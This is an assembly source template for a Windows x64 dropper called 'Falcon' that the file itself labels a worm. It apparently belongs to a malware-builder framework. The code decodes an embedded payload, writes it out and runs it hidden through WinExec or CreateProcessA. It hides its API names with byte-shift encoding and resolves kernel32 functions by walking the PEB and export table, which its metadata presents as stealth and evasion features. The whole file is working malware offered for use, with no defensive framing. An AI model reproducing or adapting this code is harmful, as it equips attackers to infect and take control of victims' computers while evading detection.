#!name##Falcon
#!types##worm
#!info##Assembler worm [W] [x64]. A lightweight worm written entirely in Assembly, making it extremely small and efficient. Upon execution, it decodes a payload, writes it to disk, and launches it using either WinExec or OpenProcessA. It supports embedding any type of payload, with a special variable allowing the creation of a custom execution command. Falcon uses dynamic imports fetched directly from memory, enhancing stealth and evasion capabilities
#!system_FLAG##[W]
#!banned##module##starter##shadow##junk
#!globalVar##COMPILER##mingw-x64##Compiler name
#!globalVar##OS_EXEC##win##Target system executable
#!globalVar##NO_DLL##True##Not include DLLs
#!globalVar##SHOW##gui##runs program in gui (background)
#!processWorm##WormLib
#!lang##asm
#!reqSMod##PayStoreAsm##AsmUnloader
#!reqVar##FAL_enc_byte##Increase the 'hex' value of each character in variable names.##int
#!setVar##FAL_enc_byte##2##int
#!reqVar##FAL_cmd##Command to execute payload.##str
#!setVar##FAL_cmd##cmd.exe /C python##str
#!reqVar##GUI##When set to True, the program runs as a background windowed application. When False, it runs in a console window with visible output.##str
#!setVar##GUI##True##str
#!reqVar##FAL_exe##Specifies the API function used to launch the payload. Accepts WinExec or OpenProcessA. For stealth mode, OpenProcessA is recommended.##str
#!setVar##FAL_exe##OpenProcessA##str

{% if TO_TEMPLATE_GUI == False or TO_TEMPLATE_GUI == 'False' %}
    {% set FALCON_ENTRY = "Main" %}
    {% set FAL_hide = False %}
{% else %}
    {% set FALCON_ENTRY = "WinMain" %}
    {% set FAL_hide = True %}
{% endif %}

{% if FAL_exe == "OpenProcessA" %}
    {% set FALCON_EXECUTE = 'FALCON_StartLevel2'%}
{% else %}
    {% set FALCON_EXECUTE = 'FALCON_StartLevel1'%}
{% endif %}

bits 64
default rel

extern ExitProcess

extern lstrcmpA
extern UN_PlayerItems
extern UnloadStorage
extern LengthStorage

%define FALCON_PLAYER_LEN 1024  ; max length cmd
%define FALCON_PLAYER_MAX_LIFE {{FAL_enc_byte}}    ; number decryption bytes
%define FALCON_HIDE_VEHICLE 0x08000000
%define FALCON_SHOW_VEHICLE 0
%define DUCK_TALES_BUFF_LEN 128
%define DUCK_TALES_DISCOVER {{FAL_enc_byte}}   ; number decryption bytes

struc FALCON_INFO
    .cb             resd 1
    .lpReserved     resq 1
    .lpDesktop      resq 1
    .lpTitle        resq 1
    .dwX            resd 1
    .dwY            resd 1
    .dwXSize        resd 1
    .dwYSize        resd 1
    .dwXCountChars  resd 1
    .dwYCountChars  resd 1
    .dwFillAttr     resd 1
    .dwFlags        resd 1
    .wShowWindow    resw 1
    .cbReserved2    resw 1
    .lpReserved2    resq 1
    .hStdInput      resq 1
    .hStdOutput     resq 1
    .hStdError      resq 1
endstruc

struc FALCON_INFORMATION
    .hProcess       resq 1
    .hThread        resq 1
    .dwProcessId    resd 1
    .dwThreadId     resd 1
endstruc

section .data
    FAL_enemy: db {{TOOL.asm_hex_encrypt_bytes(FAL_cmd, FAL_enc_byte)}}  ; '{{FAL_cmd}}'
    FAL_level1: db {{TOOL.asm_hex_encrypt_bytes("WinExec", FAL_enc_byte)}} ; WinExec
    FAL_level2: db {{TOOL.asm_hex_encrypt_bytes("CreateProcessA", FAL_enc_byte)}}; CreateProcessA
    FAL_FI:
        istruc FALCON_INFO
            at FALCON_INFO.cb, dd 104
            at FALCON_INFO.dwFlags, dd 0x00000001
            at FALCON_INFO.wShowWindow, dw 1
        iend
    FAL_INF:
        istruc FALCON_INFORMATION
        iend
    
    DT_player_item1: db {{TOOL.asm_hex_encrypt_bytes("LoadLibraryA", FAL_enc_byte)}} ; LoadLibraryA
    DT_player_item2: db {{TOOL.asm_hex_encrypt_bytes("GetProcAddress", FAL_enc_byte)}}    ; GetProcAddress
section .bss
    FAL_player: resb FALCON_PLAYER_LEN  ; buffer for decrypted command
    FAL_player_pos: resq 1  ; FAL_player index (bytes)
    
    DT_Chest: resq 1    ; kernel32.dll address
    DT_McDuck: resq 1   ; Export Table address
    DT_ship1: resq 1    ; LoadLibraryA
    DT_ship2: resq 1    ; GetProcAddress
    DT_ship_hold: resb DUCK_TALES_BUFF_LEN  ; buffer
    DT_ship_hold2: resb DUCK_TALES_BUFF_LEN  ; buffer
section .text
    global {{FALCON_ENTRY}}

{{FALCON_ENTRY}}:
    mov rbp, rsp; for correct debugging
    sub rsp, 40

    call UnloadStorage
    mov rdx, rax   
    call LengthStorage
    
    mov r8, rax
    call UN_PlayerItems
    mov rcx, rax
    call {{FALCON_EXECUTE}}
    
    call Exit

Exit:
    sub rsp, 40
    mov rcx, 0
    call ExitProcess
    
FALCON_StartLevel2:
    push rbp
    mov rbp, rsp
    sub rsp, 8
    
    sub rsp, 40
    call FALCON_GetLife
    mov rcx, FAL_level2
    call _DT_GetItem
    add rsp, 40
    
    
    ;create process
    sub rsp, 88
    mov rcx, 0
    lea rdx, [FAL_player]
    xor r8, r8                  ; lpProcessAttributes = NULL
    xor r9, r9                  ; lpThreadAttributes = NULL
    mov qword [rsp + 32], 0     ; bInheritHandles = FALSE
    {% if FAL_hide %}
    mov qword [rsp + 40], FALCON_HIDE_VEHICLE     ; dwCreationFlags
    {% else %}
    mov qword [rsp + 40], FALCON_SHOW_VEHICLE     ; dwCreationFlags
    {% endif %}
    mov qword [rsp + 48], 0     ; lpEnvironment = NULL
    mov qword [rsp + 56], 0     ; lpCurrentDirectory = NULL
    lea rbx, [FAL_FI]
    mov qword [rsp + 64], rbx   ; lpStartupInfo
    lea rbx, [FAL_INF]
    mov qword [rsp + 72], rbx   ; lpProcessInformation
    call rax
    add rsp, 88
    
    add rsp, 8
    pop rbp
    ret



FALCON_StartLevel1:
; Use WinExec
; REQUIREMENTS: stack allign to 16
; IN: rcx - pointer command, path etc.
    push rbp
    mov rbp, rsp
    sub rsp, 8
    
    sub rsp, 40
    call FALCON_GetLife
    mov rcx, FAL_level1
    call _DT_GetItem
    lea rcx, [FAL_player]
    mov rdx, 0
    call rax
    add rsp, 40
    
    add rsp, 8
    pop rbp
    ret

    
%macro _FALCON_copy 1
    %rep %1
        dec sil
    %endrep
%endmacro

FALCON_GetLife:
; Decodes a command and combines it with the given command.
; REQUIREMENTS: stack allign to 16
; IN: rcx - pointer command, path etc.
; OUT: rax - pointer to FAL_player. Full command.
    push rbp
    mov rbp, rsp
    push rsi
    push rdi
    push rbx
    push r12
    push r13
    
    ;clear buffer
    xor rbx, rbx    ; counter
    lea rdi, [FAL_player]
    .clear_loop:
        cmp rbx, FALCON_PLAYER_LEN
        je .reset_counter
        mov byte [rdi + rbx], 0
        inc rbx
        jmp .clear_loop
    
    ; copy 1st part command
    .reset_counter:
        xor rbx, rbx
        xor rsi, rsi
        lea r12, [FAL_enemy]
    .copy_1st_loop:
        mov sil, [r12 + rbx]
        cmp sil, 0
        je .add_space
        _FALCON_copy FALCON_PLAYER_MAX_LIFE
        mov byte [rdi + rbx], sil
        inc rbx
        jmp .copy_1st_loop
    ; add second part command
    .add_space:
        mov byte [rdi + rbx], 0x20  ; add space to command
        inc rbx
        xor r13, r13    ; counter FAL_player
    .copy_2st_loop:
        mov sil, [rcx + r13]
        cmp sil, 0
        je .return
        mov byte [rdi + rbx], sil
        inc rbx
        inc r13
        jmp .copy_2st_loop
    
    .return:
        lea rax, [FAL_player]
        pop r13
        pop r12
        pop rbx
        pop rdi
        pop rsi
        pop rbp
        ret


;---------------------------------------- Duck Tales --------------------------------------

%macro _DT_mCopy 2
    push rsi
    push rdi
    push rcx
    push rax
    ; load buffer
    lea rsi, %1
    lea rdi, %2
    
     ;reset dest buffer
     xor rcx, rcx
     .mCopy_clear:
        cmp rcx, DUCK_TALES_BUFF_LEN
        je .mCopy_begin
        mov byte[rdi + rcx], 0
        inc rcx
        jmp .mCopy_clear
    
    .mCopy_begin:
        xor rcx, rcx
        xor rax, rax
        .mCopy_loop:
            cmp rcx, DUCK_TALES_BUFF_LEN
            je .mCopy_end
            mov al, [rsi + rcx]
            mov [rdi + rcx], al
            inc rcx
            jmp .mCopy_loop           
    .mCopy_end:
        pop rax
        pop rcx
        pop rdi
        pop rsi   
%endmacro

_DT_GetDuck:
; load DLL and get function address
; REQUIREMENTS: stack allign to 16
; IN: rcx - encoded function name
; IN: rdx - encoded dll name
; OUT: rax - function address or 0
    push rbp
    mov rbp, rsp
    sub rsp, 64 ; shadow space
    mov [rbp-8], rcx    ; save function name
    mov [rbp-16], rdx   ; save dll name
      
    ; check if load library address exists
    lea rax, [DT_ship1]
    mov rax, [rax]
    cmp rax, 0
    je .loading
    
    .begin:
        ; decode function name
        mov rcx, [rbp-8]
        call _DT_discover_item
        ; copy function name
        _DT_mCopy DT_ship_hold, DT_ship_hold2
        ; decode dll name
        mov rcx, [rbp-16]
        call _DT_discover_item
        ; DT_ship_hold - dll name
        ; DT_ship_hold2 - function name
        
        ; load dll
        lea rax, [DT_ship1] ; get LoadLibraryA address
        mov rax, [rax]
        lea rcx, DT_ship_hold   ; pointer to dll name
        call rax    ; execute LoadLibraryA
        cmp rax, 0
        je .return

        ; load function
        mov rcx, rax
        lea rdx, DT_ship_hold2  ; pointer to function name
        lea rax, [DT_ship2] ; get GetProcAddress address
        mov rax, [rax]  ; execute function
        call rax
        
    .return:
        add rsp, 64 ;restore stack
        pop rbp
        ret
    
    .loading:
        mov rcx, DT_player_item1
        call _DT_GetItem    ; get LoadLibraryA
        lea rcx, [DT_ship1]
        mov [rcx], rax  ; save address
        mov rcx, DT_player_item2
        call _DT_GetItem    ; get GetProcAddress
        lea rcx, [DT_ship2]
        mov [rcx], rax  ; save address
        jmp .begin

_DT_GetItem:
; get function address from kernel32
; REQUIREMENTS: stack allign to 16
; IN: rcx - encoded function name
; OUT: rax - function address
    push rbp
    mov rbp, rsp
    ; r13 - kernel32 addr
    ; r14 - Export Table addr
    ; rbx - Number of functions
    ; rsi - counter
    ; r15 - temp memory
    push r13
    push r14
    push rbx
    push rsi
    push r15
    push rcx
    push rdx
    push r8
    push r9
    push r10
    push r11
    
     ; decode and save function name
    sub rsp, 40
    call _DT_discover_item
    add rsp, 40
    
    
    ; check if Export Table address exist
    lea rax, [DT_McDuck]
    mov rax, [rax]
    cmp rax, 0
    je .discover_chest
    .begin:
        lea r13, [DT_Chest]
        mov r13, [r13]  ; kernel32 address
        lea r14, [DT_McDuck]
        mov r14, [r14]  ; ; Export Table address
        mov ebx, [r14+0x14] ; get number of function
        xor rsi, rsi    ; reset counter
    
    .loop:
        cmp rsi, rbx    ; if counter > number of functions
        jg .not_find
         ; get Function name
        mov r15d, [r14+0x20]    ; RVA function name
        add r15, r13    ; RVA function name + kernel32 address
        mov r15d, [r15 + 4 * rsi]   ; get next entry RVA function name in table
        add r15, r13    ; function name + kernel32 address
        
        ; compare function name
        sub rsp, 40 ;shadow space
        mov rcx, r15
        lea rdx, [DT_ship_hold]
        call lstrcmpA
        add rsp, 40 ; restore stack
        
        cmp rax, 0
        je .finded
        
        ; counter = counter + 1
        inc rsi
        jmp .loop
    
    .return:
        pop r11
        pop r10
        pop r9
        pop r8
        pop rdx
        pop rcx
        pop r15
        pop rsi
        pop rbx
        pop r14
        pop r13
        pop rbp
        ret
    
    .finded:
        mov eax, [r14 + 0x24]   ; get AddressOfNameOrdinals RVA (dword)
        add rax, r13    ; Name Ordinals + kernel32 address
        xor rcx, rcx
        mov cx, [rax + 2 * rsi] ; get function index (word) to function address
        mov eax, [r14 + 0x1c]   ; get AddressOfFunctions RVA
        add rax, r13    ; Address of function + kernel32 address
        mov ecx, [rax + 4 * rcx]    ; get RVA function address
        add rcx, r13    ; function address + kernel32 address
        
        mov rax, rcx    ; return function address
        jmp .return
    
    .not_find:
        xor rax, rax    ; return None
        jmp .return
    
    .discover_chest:
        sub rsp, 40
        call _DT_discover_chest
        add rsp, 40
        jmp .begin

_DT_discover_item:
; REQUIREMENTS: stack allign to 16
; IN: rcx - pointer to encoded func name
; OUT: rax - pointer to DT_ship_hold - decoded func name

%macro _DT_discover_show 1
    %rep %1
        dec al
    %endrep
%endmacro

    push rbp
    mov rbp, rsp
    push rcx
    push rsi
    push rdi
    
    ; clear buffer
    xor rsi, rsi    ; counter
    lea rdi, [DT_ship_hold]
    .clear_loop:
        cmp rsi, DUCK_TALES_BUFF_LEN
        je .clear_end
        mov byte [rdi + rsi], 0
        inc rsi
        jmp .clear_loop
    
    .clear_end:
        xor rsi, rsi
        xor rax, rax
    ;decode func name
    .loop:
        mov byte al, [rcx + rsi]    ; move encode bytes to al
        cmp al, 0
        je .return
        _DT_discover_show DUCK_TALES_DISCOVER
        mov byte [rdi + rsi], al    ; move decoded byte to buffer
        inc rsi ;   counter + 1
        jmp .loop
        
    .return:
        lea rax, [DT_ship_hold]
        pop rdi
        pop rsi
        pop rcx
        pop rbp
        ret



_DT_discover_chest:
; find kernel32 and export table address
; REQUIREMENTS: stack allign to 16
; OUT: DT_Chest, DT_McDuck
    push rbp
    mov rbp, rsp
    push rbx    ; save rbx
    push rsi    ; save rsi
    push rdi    ; save rdi
   
    xor rbx, rbx
    mov rbx, gs:[0x60]  ; Get address of PEB struct
    mov rbx, [rbx+0x18] ; Get PEB_LDR_DATA address
    mov rbx, [rbx+0x20] ; Get InMemoryOrderModuleList
    mov rbx, [rbx]  ; 1st entry in InMemoryOrderModuleList (ntdll.dll)
    mov rbx, [rbx]  ; 2st entry in InMemoryOrderModuleList (kernel32.dll)
    mov rsi, [rbx+0x20]  ; Get kernel32.dll address
    lea rdi, [DT_Chest]
    mov [rdi], rsi  ; save kernel32.dll address
    
    xor rdi, rdi
    mov edi, [rsi + 0x3c]   ; RVA PE file signature
    add rdi, rsi    ; RVA PE + kernel32 addr
    add rdi, 0x88   ; 0x88 bytes after the PE signature is the RVA for the Export Table
    mov edi, [rdi]  ; get RVA Export Table
    add rdi, rsi    ; RVA Export Table + kernel32 address
    lea rbx, [DT_McDuck]
    mov [rbx], rdi  ; save Export Table address

    ; restore registry
    pop rdi
    pop rsi
    pop rbx
    pop rbp
    ret
